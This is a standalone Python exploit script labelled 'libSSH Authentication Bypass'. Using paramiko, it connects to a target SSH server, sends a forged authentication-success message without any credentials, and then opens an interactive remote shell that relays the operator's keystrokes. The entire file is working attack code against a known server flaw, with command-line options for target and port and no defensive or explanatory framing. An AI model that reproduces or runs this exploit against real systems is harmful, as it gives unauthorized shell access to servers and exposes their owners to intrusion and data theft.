import paramiko
import socket
import argparse
from sys import argv, exit
import select
import sys

parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('-t', '--target', help='Specify target')
parser.add_argument('-p', '--port', type=int, help='Specify port', default=int(22))
parser.add_argument('-lf', '--logfile', help='Logfile to write connection log', default='paramiko.log')

args = parser.parse_args()

def bypass(target, port):

    sock = socket.socket()
    try:
        sock.connect((target, port))

        message = paramiko.Message()
        transport = paramiko.Transport(sock=sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        channel = transport.open_session()
        channel.get_pty()
        channel.invoke_shell()

        while True:
            r, w, e = select.select([channel, sys.stdin], [], [])
            if channel in r:
                output = channel.recv(1024)
                if len(output) == 0:
                    print("Connection closed by remote host.")
                    break
                sys.stdout.write(output.decode())
                sys.stdout.flush()
            if sys.stdin in r:
                user_input = sys.stdin.readline()
                channel.send(user_input)

    except paramiko.SSHException as e:
        print('Not vulnerable!')
        return 1
    except socket.error:
        print('Unable to connect')
        return 1
    
def main():
    paramiko.util.log_to_file(args.logfile)
    try:
        target = args.target
        port = args.port
    except:
        parser.print_help()
        exit(1)
    bypass(target, port)

if __name__ =='__main__':
    exit(main())
